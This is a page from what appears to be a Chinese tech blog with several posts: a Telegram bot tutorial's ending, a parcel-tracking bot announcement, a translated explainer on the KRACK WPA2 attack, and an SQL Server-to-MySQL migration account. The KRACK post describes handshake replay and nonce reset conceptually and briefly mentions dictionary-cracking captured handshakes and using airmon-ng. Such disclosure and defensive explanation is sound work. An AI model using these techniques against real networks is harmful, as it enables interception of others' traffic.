<p><code>reply_to</code>则是回复某条消息，是<code>send_message(message.chat.id, text, reply_to_message_id=message.message_id, **kwargs)</code>的方便用法，需要两个参数，一个是message，一个是回复的内容；</p>
<p>如果我们要用<code>send_message</code>来实现<code>relpy_to_message</code>，那么就要手动用关键字参数指定回复哪条消息，如代码中的help命令所示。</p>
<h4 id="if-name-x3D-x3D-‘-main-‘"><a href="#if-name-x3D-x3D-‘-main-‘" class="headerlink" title="if __name__ &#x3D;&#x3D; ‘__main__‘:"></a>if __name__ &#x3D;&#x3D; ‘__main__‘:</h4><p>这一行则定义了这个Python程序的入口，在他下面运行<code>bot.polling()</code>方法。这个方法可神奇了呢，他会帮你处理各种事件，自动帮你从API里取回消息，基本不用你干预。</p>
<p>如果我们不用<code>__name__</code>控制的话，那么当在其他文件中import时，也就顺便运行这个文件啦。这很明显不是我们想要的结果。</p>
<h2 id="运行与调试"><a href="#运行与调试" class="headerlink" title="运行与调试"></a>运行与调试</h2><p>如果一切顺利的话，当你点击运行时，跟机器人说话，它就会回复你啦。当然啦，运行（run）与调试（debug）其实还是有些区别的，关于这的一些技巧，我们可以以后再谈~</p>
<p><img src="/images/102017_1429_Telegrambot8.png"></p>
<p>哦对了，我们还需要导出依赖，方便别人也能够用啊！</p>
<p>很简单，进入到virtual env，运行如下命令：</p>
<p>pip freeze &gt; requirements.txt</p>
<p>别人用的时候，<code>pip install -r requirements.txt</code>就可以安装对应的依赖啦。</p>
<h2 id="我该怎么长期运行我的机器人呢"><a href="#我该怎么长期运行我的机器人呢" class="headerlink" title="我该怎么长期运行我的机器人呢"></a>我该怎么长期运行我的机器人呢</h2><p>这个问题问得好！首先你得有个在海外的服务器（或者让程序走代理），可以考虑用用<code>nohup</code>或者<code>screen</code>，这样当你关掉终端之后，程序还会继续运行。呃，那些用Windows做服务器的，当我什么都没说好了。</p>
<p>当然了正经的办法，是要用systemd或者supervisor的。具体可以<a target="_blank" rel="noopener" href="https://dmesg.app/linux-keep-running.html">参考这里</a></p>
<h2 id="我想要任务计划机器人，怎么办"><a href="#我想要任务计划机器人，怎么办" class="headerlink" title="我想要任务计划机器人，怎么办"></a>我想要任务计划机器人，怎么办</h2><p>这个问题问得也很好。我们可能需要某种机器人，每十分钟给用户发送一条消息。</p>
<p>此时我的建议是，<strong>如果需求很简单，那么使用操作系统自带的任务计划功能</strong>来执行脚本（Linux为cron）。</p>
<p>可能有人会有反对意见了。Python里有很多优秀的任务调度、任务计划库，比如说apscheduler。这样也是可以的，只不过需要多写点代码！</p>
<p>当然了，有些时候我们的需求比较灵活，操作系统提供的任务计划用起来会很麻烦，此时就只能用一些任务调度的库啦。</p>
<h2 id="下一篇打算讲点什么呢"><a href="#下一篇打算讲点什么呢" class="headerlink" title="下一篇打算讲点什么呢"></a>下一篇打算讲点什么呢</h2><p>如果我们的机器人只能以固定的模式讲话，那么显然是不行的！</p>
<p>那么下一篇，我们就要尝试着接入其他服务（使用pycurl发送POST或者GET请求），操作数据库，给机器人加入”正在输入”的特效，更加深入的理解Telegram Bot API。当然了，我下一篇说不定等到啥时候，所以，别太期待。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/20/tgbot0/index/" data-id="clhp7rtld009ms2qrgatk5z7n" data-title="[Telegram bot系列]0：用Python写一个Telegram Bot 简单的回话bot" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-expressbot/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/18/expressbot/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-18T00:00:00.000Z" itemprop="datePublished">2017-10-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/share/">share</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/18/expressbot/index/">ExpressBot：一个可以帮你查快递、追踪快递状态、还能陪聊的Telegram bot</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>大家好，小土豆我又来水贴了。</p>
<p>这是一个能够帮你查快递、追踪快递状态的Telegram机器人。当然，还能陪聊，你跟他说语音也能听懂，什么都能聊，查个天气什么的也不在话下~~</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="查询快递"><a href="#查询快递" class="headerlink" title="查询快递"></a>查询快递</h3><p>接口来自于快递100，差不多能查个七八百家的样子？</p>
<h3 id="查询历史"><a href="#查询历史" class="headerlink" title="查询历史"></a>查询历史</h3><p>反正是都能看到的啦，也可以删除的</p>
<h3 id="追踪快递状态"><a href="#追踪快递状态" class="headerlink" title="追踪快递状态"></a>追踪快递状态</h3><p>只要是未妥投的，都会十分钟查询一次，如有更新会发消息给你~好像就这一个亮点了。</p>
<h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p>随意的截几个好了~</p>
<p><img src="/images/101817_0558_ExpressBot1.png"></p>
<p><img src="/images/101817_0558_ExpressBot2.png"></p>
<p><img src="/images/101817_0558_ExpressBot3.png"></p>
<p>估计bug多多，被<a target="_blank" rel="noopener" href="https://blog.yandere.moe/">Yandere@萌</a>调戏炸了好几次</p>
<h2 id="以后打算干嘛"><a href="#以后打算干嘛" class="headerlink" title="以后打算干嘛"></a>以后打算干嘛</h2><p>让这个bot来跟人扯淡闲聊呗~</p>
<h2 id="开源地址及部署方法"><a href="#开源地址及部署方法" class="headerlink" title="开源地址及部署方法"></a>开源地址及部署方法</h2><p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ExpressBot'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/ExpressBot&#39;\]开源地址\[/gt\]</a> 初学Python，还望多多指教；欢迎star、fork、PR；还望有能力的大神能够帮我进行安全审计和健壮性测试</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/18/expressbot/index/" data-id="clhp7rtg8002ks2qr7ss4htue" data-title="ExpressBot：一个可以帮你查快递、追踪快递状态、还能陪聊的Telegram bot" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-krack/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/10/17/krack/index/" class="article-date">
  <time class="dt-published" datetime="2017-10-17T00:00:00.000Z" itemprop="datePublished">2017-10-17</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/security/">security</a>►<a class="article-category-link" href="/categories/security/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/10/17/krack/index/">WPA2被破解？翻译、对KRACK的一些误解以及你应该做什么</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这篇差不多是翻译和一些补充以及一些很多人容易误解的地方，欢迎各路英语、信息安全、密码学大神斧正。（反正我翻译的也够仓促的，基本上等于没校对。有一些术语可能翻译的不准确，还望指正。文章内容略有删节）</p>
<h2 id="TL-DR太长不看版本"><a href="#TL-DR太长不看版本" class="headerlink" title="TL;DR太长不看版本"></a>TL;DR太长不看版本</h2><p>WPA&#x2F;WPA2（包括Personal和Enterprise以及使用各种加密套件）协议本身被发现存在一些漏洞，更具体的说也就是四路握手中客户端可以被诱导重装密钥（甚至是全零密钥）导致客户端发送的报文可以被解密的漏洞。</p>
<p>注意的是，需要<strong>客户端打安全补丁</strong>来确保不会重装相同密钥。估计大部分Android设备都完蛋了（亲儿子祖国放心系列除外），Linux发行版、Apple的产品和Windows基本上都已经释出了安全更新。</p>
<p>别一天天瞎说什么WPA2加密协议已遭破解，Wi-Fi不再安全已经沦陷了，形如虚设什么的。破解破解破解，听起来真是骇人耸听，不了解细节就瞎说那怎么能行。想要抓到四路握手包还得信号足够强呢，这信号也得足够强啊，是吧。</p>
<p>所以啊，说了这么多，只有HTTPS是不够的，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E4%B8%A5%E6%A0%BC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8">HSTS</a>和HSTS Preload List更是刚需啊；别SSH的时候忽略警告啊，警告啊警告啊，另一边是悬崖啊，警告是不能忽视的啊。</p>
<p>哦对了，<strong>搞不到Wi-Fi密码的</strong>，搞不到的（但是说不定能搞到更有价值的东西啊），想要搞Wi-Fi密码，抓四路握手然后跑字典吧。</p>
<p>PS，今早RSA也被曝出现问题，<a target="_blank" rel="noopener" href="https://crocs.fi.muni.cz/public/papers/rsa_ccs17">ROCA: Vulnerable RSA generation</a>，其实这个是英飞凌的实现问题。英飞凌的某些产品中使用了不够健壮的伪随机数，导致可以快速进行质因数分解。RSA本身是没有问题的啦。</p>
<h2 id="本文来源"><a href="#本文来源" class="headerlink" title="本文来源"></a>本文来源</h2><p>KRACK Attacks</p>
<p><a target="_blank" rel="noopener" href="https://www.krackattacks.com/">https://www.krackattacks.com/</a></p>
<p>KRACK：<strong>K</strong>ey <strong>R</strong>einstallation <strong>A</strong>tta<strong>ck</strong>s 密钥重装攻击</p>
<p>Breaking WPA2 by forcing nonce reuse 通过强制重复使用nonce来破解WPA2</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>我们在大多数现代保护Wi-FI网络的WPA2协议中发现了严重的安全漏洞。在受害者范围之内，攻击者可以以”密钥重装攻击”的方式利用这些漏洞。更进一步的说，攻击者可以利用这种新奇的攻击方式在之前被认为是安全的加密的网络中获取信息。这种方式可以用于窃取敏感信息，比如说信用卡卡号，密码，聊天信息，电子邮件，照片等等。<strong>这种攻击方式适用于所有受保护的（译者注：WPA2&#x2F;WPA）Wi-Fi网络。</strong>根据不同的网络配置，也可能注入、操纵数据，比如说攻击者可能会把勒索软件、恶意软件注入到网站之中（译者注：HTTP网站）。</p>
<p>漏洞的成因在于Wi-Fi标准自身，而不是产品或者实现的设计缺陷。因此，任何对WPA2协议的正确实现均很有可能收到影响。为防止此种攻击，用户必须尽快在安全补丁发布之后升级受影响的设备。注意，<strong>如果你的设备支持Wi-Fi，那么很有可能会受到此漏洞的影响</strong>。在我们最初的研究中，我们发现Android，Linux，Apple，Windows，OpenBSD，MediaTek，Linksys和其他的一些全部都到此漏洞的变种攻击。</p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>我们在一部Android手机上执行了一次KRACK攻击。在这次演示中，攻击者可以解密受害者传输的所有数据。对于攻击者来说，这样的攻击很容易实现，因为KRACK攻击在Linux和Android 6.0及更高版本特别有效。这是因为<strong>Android和Linux可以被诱发到安装（重装）全零加密密钥</strong>（all-zero encryption key）。在攻击其他设备时，尽管能够解密大量数据，但是也很难解密全部数据。无论如何，下面的演示将在受保护的Wi-Fi中进行KRACK攻击时可以获取到的信息进行了高亮显示。</p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?time%5C_continue=265&v=Oh4WURZoR98">https://www.youtube.com/watch?time\_continue=265&amp;v=Oh4WURZoR98</a></p>
<p>视频来源<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?time_continue=265&v=Oh4WURZoR98">YouTube</a>，需要翻墙 译者注：视频中使用了SSL降级攻击，这说明，HSTS和HSTS Preload是非常重要的。</p>
<p>我们的攻击并不被限制于获取登录信息。通常来说，受害者传输的任何数据均可被解密。另外，依赖于使用的设备和网络设置，也有可能解密发送给受害者的数据（比如说网站内容）。尽管网站和应用可能会使用HTTPS作为额外的保护措施，我们要警告在多种情况下，这种附加的保护依旧可以被绕过。比如说，在之前HTTPS可以以多种方式绕过，包括<a target="_blank" rel="noopener" href="https://pdfs.semanticscholar.org/48fc/8f1aa0b6d1e4266b8017820ff8770fb67b6f.pdf">非浏览器应用</a>，<a target="_blank" rel="noopener" href="https://www.imperialviolet.org/2014/02/22/applebug.html">Apple的iOS和macOS</a>，Android的应用（<a target="_blank" rel="noopener" href="https://arstechnica.com/information-technology/2015/04/android-apps-still-suffer-game-over-https-defects-7-months-later/">例1</a>，<a target="_blank" rel="noopener" href="https://arxiv.org/ftp/arxiv/papers/1505/1505.00589.pdf">例2</a>），<a target="_blank" rel="noopener" href="http://blog.ioactive.com/2014/01/personal-banking-apps-leak-info-through.html">银行应用</a>甚至是<a target="_blank" rel="noopener" href="https://arstechnica.com/information-technology/2017/01/majority-of-android-vpns-cant-be-trusted-to-make-users-more-secure/">VPN应用</a>。</p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p><img src="/images/101717_0548_WPA2KRAC1.png"></p>
<p>图片来源于维基百科，按照CC协议授权。漏洞发生在第三步GTK+MIC中。</p>
<p>我们主要攻击WPA2协议的四路握手。当客户端想要加入受保护的Wi-Fi网络时将会使用四路握手，并使用四路握手来确认客户端与接入点持有正确的认证信息（也就是PSK，俗称Wi-Fi密码）。同时，四路握手也会协商出来一个用户加密随后通信的全新的加密密钥。目前，所有的现代受保护的Wi-Fi网络均使用这种四路握手的机制。这也就是说这些网络都会收到我们的攻击（和一些变种）的影响。比如说，攻击可以针对个人和企业Wi-Fi，可以针对更古老的WPA标准，也可以针对最新的WPA2标准，甚至是只是用AES的网络。<strong>我们的所有攻击方式均使用了一种新颖的、被称作KRACK（密钥重装攻击）的手段。</strong></p>
<h3 id="密钥重装攻击：高级描述"><a href="#密钥重装攻击：高级描述" class="headerlink" title="密钥重装攻击：高级描述"></a>密钥重装攻击：高级描述</h3><p>在密钥重装攻击中，攻击者诱导受害者重装一个已使用密钥。<strong>这由操纵和重放密码握手信息（cryptographic handshake messages）实现。</strong>受害者重装密钥时，像是自增传输分组序号（incremental transmit packet number，也就是nonce）、重放计数器（replay counter）这类参数会被重置到初始值。本质上来说，为了保证安全，密钥应该只被安装并使用一次。不幸的是，我们发现WPA2协议并没有强制要求这一点。通过操纵密码握手信息，我们可以在实践中利用这一弱点。</p>
<h3 id="密钥重装攻击：四路握手的实际攻击案例"><a href="#密钥重装攻击：四路握手的实际攻击案例" class="headerlink" title="密钥重装攻击：四路握手的实际攻击案例"></a>密钥重装攻击：四路握手的实际攻击案例</h3><p>如在研究中提出的，密钥重装攻击的思路可以被总结为如下步骤：</p>
<p>客户端链接到网络时，它会执行四路握手并协商一个全新的加密密钥。它会在四路握手的第三步的报文安装这个密钥。当密钥安装之后，设备会使用加密协议和此密钥来加密正常的数据帧。然而，由于报文可能会丢失或者丢弃，无线接入点（AP）在没有收到合适的响应时会重传第三段报文。因此，客户端可能会收到多个第三段报文，每次收到这个报文，客户端都会重新安装相同的密钥，然后重置自增传输分组序号（incremental transmit packet number，nonce）和重放计数器（replay counter）。我们已经演示了<strong>攻击者可以通过收集、重放四路握手的第三个报文（Message 3）来强制重置nonce。</strong>通过如此强制重置nonce，加密协议便可遭受攻击，比如：分组可以被重放、解密或者伪造。同样的攻击手段也可以被用于攻击组密钥（group key），PeerKey，通道直接链路建立（Tunneled Direct Link Setup，TDLS），快速基本服务设置转换(fast BSS transition)握手。</p>
<h3 id="实际影响"><a href="#实际影响" class="headerlink" title="实际影响"></a>实际影响</h3><p>我们认为，传播广泛、影响最大的攻击手段是针对四路握手的密钥重装攻击。我们在两种观察情况下做出这个判断。一是，在我们的研究中，我们发现大多数客户端都受此影响；二是，攻击者可以通过这种手段来解密客户端发送的报文，允许他们截获如密码、cookies在内的敏感信息。由于密钥重装攻击会促使传输nonces（有时会被称为报文分组或者初始化向量）被设置为0，因此解密通信变得可能。因此，<strong>使用了以前使用过的同样的nonce的加密密钥（the same encryption key is used with nonce values that have already been used in the past）。</strong>随后，这就导致WPA2所有的加密协议重复使用密钥流来解密分组。如果一段已知信息重复使用了加密，提取出已使用的加密流就很容易了（In case a message that reuses keystream has known content, it becomes trivial to derive the used keystream.）。之后，这个密钥流就可以用来解密同样nonce值的通信。当没有已知内容（known content）时，很难解密通信，尽管在某些案例下（比如说英文文档还是可以被解密的）。实际中，找到已知内容（known content）的分组并不是什么问题，所以可以假设任何报文均可以被解密。</p>
<p>这种解密报文的能力可以用于解密TCP的SYN握手包。这会使得攻击者获取到一个TCP连接的序号，劫持TCP通信。因此，即使是使用了WPA2，攻击者也可以像开放式网络做出最常见的攻击：在未加密的HTTP中注入恶意信息。比如说，攻击者可以利用此手段在受害者访问的网站中加入勒索软件、恶意软件。</p>
<p>如果受害者使用WPA-TKIP（译者注：临时密钥完整性协议，已被弃用）和GCMP而不是AES-CCMP（译者注：CCMP 计数器模式密码块链消息完整码协议），影响就更惨烈了：在这些加密协议上，重用nonce不仅可以使攻击者解密通信，还可以使攻击者伪造、注入通信。而且，由于GCMP在通信的双向都是用同样的认证密钥，如果重用nonce，那么这个密钥也可以被获知。需要注意的是， WiGig（无线千兆联盟）已经不再支持GCMP。</p>
<p>报文能够被解密（以及伪造）的方向取决于握手包被攻击。简单的说，攻击四路握手的时候，我们可以解密（伪造）客户端发送的报文；攻击Fast BSS transition（快速基本服务设置转换）握手时，我们可以解密（伪造）发送给客户端的报文。最终，多数的攻击行为都能允许重放单播、广播、多播帧。</p>
<p>需要注意的是，<strong>这种攻击方式并不会窃取到Wi-Fi密码</strong>，也不会窃取到四路握手过程中全新加密密钥（以及它的任何一部分）</p>
<h3 id="Android-和Linux"><a href="#Android-和Linux" class="headerlink" title="Android 和Linux"></a>Android 和Linux</h3><p>攻击在wpa_suplicant版本号为2.4以上特别有效。wpa_suplicant是一个广泛被Linux使用的应用程序。在这里，客户端会安装全零加密密钥（all-zero encryption key）而不是重装真正的密钥。此漏洞貌似是因为Wi-Fi标准建议在第一次安装密钥之后从内存中清除加密密钥。当客户端接收到重传的第三段报文时，它会重装已清除的加密密钥，也就是全零密钥。因为Andorid使用wpa_suplicant，所以Android 6.0及以上也包含此漏洞。这使得<strong>截获、操纵由此类Linux和Android设备发送的报文变得非常容易。</strong>注意，现在大概有一半的Android设备受到此漏洞的影响。</p>
<p>译者注：标准建议在第一次安装密钥之后在对应的内存区域中清除加密密钥，所以再次收到重传的时候可能会诱导安装全零密钥；但是Windows的实现是拒绝重传，尽管没符合标准的建议，但是却巧妙的绕开了这个漏洞。不过别大意，10个CVE呢……</p>
<p>标准：怪我咯。</p>
<h2 id="论文"><a href="#论文" class="headerlink" title="论文"></a>论文</h2><p>略……</p>
<p>论文已经发布很久啦，我们也研究了更容易的执行KRACK攻击的手段。攻击macOS和OpenBSD也比论文中讨论的容易多啦。</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>略……</p>
<p>我们制作了几个脚本来检测你是否会受到KRACK攻击。</p>
<p>我们也有PoC……但是我先不发。</p>
<h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="我们需要WPA3吗"><a href="#我们需要WPA3吗" class="headerlink" title="我们需要WPA3吗"></a>我们需要WPA3吗</h3><p>不需要！幸运的是实现可以以向后兼容的方式打补丁。就是说，打了补丁的客户端可以连接到未打补丁的无线接入点，反过来也行。换句话说，打补丁的客户端还像以前那样四路握手，只不过会保证只会安装一次密钥。</p>
<p>译者注：根本就没有WPA3好不好，TLS1.3好歹也是草案呢！</p>
<h3 id="我需要改Wi-Fi密码吗"><a href="#我需要改Wi-Fi密码吗" class="headerlink" title="我需要改Wi-Fi密码吗"></a>我需要改Wi-Fi密码吗</h3><p>改Wi-Fi密码也没办法阻止、减轻此种攻击，所以没必要改了。反之，你需要确保你的设备进行安全更新。不过，把客户端设备和路由器都更新了之后，改Wi-Fi密码也从来不会是坏主意。</p>
<h3 id="我只使用WPA2-AES，这是易受攻击的吗"><a href="#我只使用WPA2-AES，这是易受攻击的吗" class="headerlink" title="我只使用WPA2-AES，这是易受攻击的吗"></a>我只使用WPA2-AES，这是易受攻击的吗</h3><p>是，依然易受攻击。KRACK可以攻击WPA1和WPA2，Personal和Enterprise，任何加密套件（WPA-TKIP，AES-CCMP，GCMP）。所以大家都需要更新设备来阻止攻击。</p>
<h3 id="我的设备易受攻击吗？"><a href="#我的设备易受攻击吗？" class="headerlink" title="我的设备易受攻击吗？"></a>我的设备易受攻击吗？</h3><p>可能。使用Wi-Fi的设备均可能易受攻击。</p>
<h3 id="如果我的路由器没有安全更新，怎么办？"><a href="#如果我的路由器没有安全更新，怎么办？" class="headerlink" title="如果我的路由器没有安全更新，怎么办？"></a>如果我的路由器没有安全更新，怎么办？</h3><p>我们主要是攻击四路握手包，也就是客户端，而不是无线接入点。所以可能你的路由器不需要安全更新。我们强烈建议你联系厂商来获得更多细节。通常来说，你应该尝试关闭客户功能（中继模式，译者注：无线桥接时会用到），禁用802.11r（快速漫游）来减轻攻击。对于一般的家庭用户，你的首要任务是更新笔记本、手机等客户端。</p>
<p>译者注：如果你的路由器是用来无线桥接的话，也就是Client+AP模式，那么还是会受到此漏洞的影响。</p>
<h3 id="四路握手已经在数学上被证明是安全的了，你们的攻击怎么会可能？"><a href="#四路握手已经在数学上被证明是安全的了，你们的攻击怎么会可能？" class="headerlink" title="四路握手已经在数学上被证明是安全的了，你们的攻击怎么会可能？"></a>四路握手已经在数学上被证明是安全的了，你们的攻击怎么会可能？</h3><p>简短的回答是，这个攻击和之前证明的并不矛盾，之前的证明默认密钥之被安装一次。相反，它只保证协商密钥不被其他人知道，这也意味着握手报文不会被伪造。</p>
<p>长篇大论……略</p>
<h3 id="如果攻击者能进行MITM（中间人攻击），他为什么不能直接解密全部数据？"><a href="#如果攻击者能进行MITM（中间人攻击），他为什么不能直接解密全部数据？" class="headerlink" title="如果攻击者能进行MITM（中间人攻击），他为什么不能直接解密全部数据？"></a>如果攻击者能进行MITM（中间人攻击），他为什么不能直接解密全部数据？</h3><p>在演示中我们已经提及了，攻击者首先在受害者和真正的Wi-Fi网络中获得中间人攻击的位置。然而，这种MITM不会让攻击者解密报文。此种MITM只能让攻击者稳定可靠的延迟、重放、阻断加密报文。所以自然是不行的啦……实际上，这种延迟、阻断报文的技术被用来执行密钥重装攻击。执行成功，之后，报文可以被解密。</p>
<h3 id="有人在搞这个漏洞吗？"><a href="#有人在搞这个漏洞吗？" class="headerlink" title="有人在搞这个漏洞吗？"></a>有人在搞这个漏洞吗？</h3><p>咱不知道是不是已经有人利用了这个漏洞了……反正我们暂时还没发PoC和Exploit。</p>
<h3 id="我是不是应该临时使用WEP协议，直到我的设备收到补丁？"><a href="#我是不是应该临时使用WEP协议，直到我的设备收到补丁？" class="headerlink" title="我是不是应该临时使用WEP协议，直到我的设备收到补丁？"></a>我是不是应该临时使用WEP协议，直到我的设备收到补丁？</h3><p>不！继续使用WPA2</p>
<p>译者注：用WEP就等着被十分钟破解吧。</p>
<h3 id="和其他针对WPA2的攻击相比，此方式有何不同？"><a href="#和其他针对WPA2的攻击相比，此方式有何不同？" class="headerlink" title="和其他针对WPA2的攻击相比，此方式有何不同？"></a>和其他针对WPA2的攻击相比，此方式有何不同？</h3><p>这是第一个针对Wi-Fi协议、不依赖猜测密码的攻击。实际上其他针对WPA2的攻击方式，比如说WPS，或者更古老的WPA-TKIP都是靠猜测密码（暴力破解的）</p>
<p>反正你就记住这是搞四路握手包的啦，是协议本身的问题啦。</p>
<h2 id="一些从其他地方看到的不准确的说法"><a href="#一些从其他地方看到的不准确的说法" class="headerlink" title="一些从其他地方看到的不准确的说法"></a>一些从其他地方看到的不准确的说法</h2><h3 id="路由器被破解被入侵"><a href="#路由器被破解被入侵" class="headerlink" title="路由器被破解被入侵"></a>路由器被破解被入侵</h3><p>都说了，这玩意是针对客户端进行的，而且攻击者没办法拿到你的Wi-Fi密码，充其量也就是会拿到解密通信。当然了，人品足够好，可能就解密了客户端登录路由器时的账号和密码。</p>
<h3 id="更改密码、隐藏SSID、MAC地址绑定、MAC地址过滤"><a href="#更改密码、隐藏SSID、MAC地址绑定、MAC地址过滤" class="headerlink" title="更改密码、隐藏SSID、MAC地址绑定、MAC地址过滤"></a>更改密码、隐藏SSID、MAC地址绑定、MAC地址过滤</h3><p>这些统统都是无法减缓这个漏洞的（这四个小伎俩只能用来防小白，遇到懂行的人开airmon-ng就搞定了），只要你用了WPA&#x2F;WPA2，这就是无解的，要是用了WEP，那更是五分钟解决啦。</p>
<p>求大家不要再说WPA&#x2F;WPA2协议被破解了，给人的感觉好像是随意一个脚本小子都能够拿个东西搞定，实际上这只是一个比较容易堵上的安全漏洞啦……（比较容易堵并不等于厂商们会屁颠屁颠的给你发补丁哦）</p>
<h2 id="总结：一般人该怎么做"><a href="#总结：一般人该怎么做" class="headerlink" title="总结：一般人该怎么做"></a>总结：一般人该怎么做</h2><p>一般来说，咱身边是很少有这种类型的变态的吧（估计抓握手包的人可能都不太多，遇见我，算你倒霉嗯~ o(*￣▽￣*)o）。再加上现在没有PoC也没有Exploit，还需要比较高级的手段而不是像EternalBlue那样一键完成。与其担心这个漏洞，还不如先把自己的Wi-Fi密码从12345678改成比较复杂的密码来抵抗抓四路握手包然后跑字典（哦对了当然还有拒绝使用Wi-Fi万能钥匙什么的0</p>
<p>当然是等厂商的更新了，还有就是大力推广HTTPS+HSTS，视频中很明显被降级了，要是有HSTS那么就可以在很大程度上抵抗降级攻击。要是实在不放心，咱开个VPN好吧。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/10/17/krack/index/" data-id="clhp7rth6004es2qrhptndbbz" data-title="WPA2被破解？翻译、对KRACK的一些误解以及你应该做什么" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-mssql-mysql/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/09/27/mssql-mysql/index/" class="article-date">
  <time class="dt-published" datetime="2017-09-27T00:00:00.000Z" itemprop="datePublished">2017-09-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/it/">it</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/09/27/mssql-mysql/index/">从SQL Server导出海量数据到MySQL的新思路</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>话说，今天给自己找了个事，要把一个数据量比较大的巨硬的SQL Server中的数据导入到MySQL中。</p>
<p>话说这数据量有多大呢？bak备份文件就有187M，数据库的表有90万行的数据。</p>
<p>那导入就导入呗，怎么来呢……</p>
<h2 id="从MSSQL中导出sql脚本"><a href="#从MSSQL中导出sql脚本" class="headerlink" title="从MSSQL中导出sql脚本"></a>从MSSQL中导出sql脚本</h2><p>似乎这是个放之四海而皆准的原则，咱都这么干。于是……</p>
<p>任务-生成脚本，高级中把“仅限架构”改成架构和数据。</p>
<p><img src="/images/092717_1621_SQLServer1.png"></p>
<p>嗯，静静等待导出……</p>
<p><img src="/images/092717_1621_SQLServer2.png"></p>
<p>唔，1.13G的脚本，估计导回到MySQL里……反正我做完饭刷完碗洗完澡了还没导完。别想了，数据量小的话还可以玩玩，这么大，放弃吧。</p>
<h2 id="MySQL-Migration-Toolkit"><a href="#MySQL-Migration-Toolkit" class="headerlink" title="MySQL Migration Toolkit"></a>MySQL Migration Toolkit</h2><p>别想了，这玩意早就停止维护了。就算用的成也一堆bug的吧。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/09/201709271650335.png"><img src="/images/201709271650335.png"></a></p>
<p>哥哥，我真的有JRE的……</p>
<h2 id="导出成csv，用MySQL-Front导入"><a href="#导出成csv，用MySQL-Front导入" class="headerlink" title="导出成csv，用MySQL Front导入"></a>导出成csv，用MySQL Front导入</h2><p>任务-导出数据，目标选择”平面文件目标”，在第一行显示列名称</p>
<p><img src="/images/092717_1621_SQLServer4.png"></p>
<p>然后打开MySQL Front输入 - csv文件，飞快的导入，好像没什么问题？然而并没有。</p>
<p><img src="/images/092717_1621_SQLServer5.png"></p>
<p>用phpmyadmin？别想了，PHP默认有上传文件大小限制，phpmyadmin本身也有，就算这俩都不是问题，Nginx还不乐意给了5xx报错呢。</p>
<p>别用MySQL Front试了，我改了各种编码格式，从utf-8到gbk到gb2312，全完蛋。</p>
<h2 id="导出成Excel"><a href="#导出成Excel" class="headerlink" title="导出成Excel"></a>导出成Excel</h2><p>那试试导出成Excel？</p>
<p>报错，一堆看不懂的错误提示。</p>
<p><img src="/images/092717_1621_SQLServer6.png"></p>
<p>打开Excel一看，65535……下一个应该溢出了啊，?回负数了啊</p>
<p><img src="/images/092717_1621_SQLServer7.png"></p>
<h2 id="SQL-Server直接导出到MySQL"><a href="#SQL-Server直接导出到MySQL" class="headerlink" title="SQL Server直接导出到MySQL"></a>SQL Server直接导出到MySQL</h2><p>看样子很牛逼哈，当然要先安装MySQL的.Net驱动程序哈。然后任务-导出，目标选择MySQL，大概像下图这样：</p>
<p><img src="/images/092717_1621_SQLServer8.png"></p>
<p>然后下一步……</p>
<p><img src="/images/092717_1621_SQLServer9.png"></p>
<p>巨硬你是我爹还不行嘛……</p>
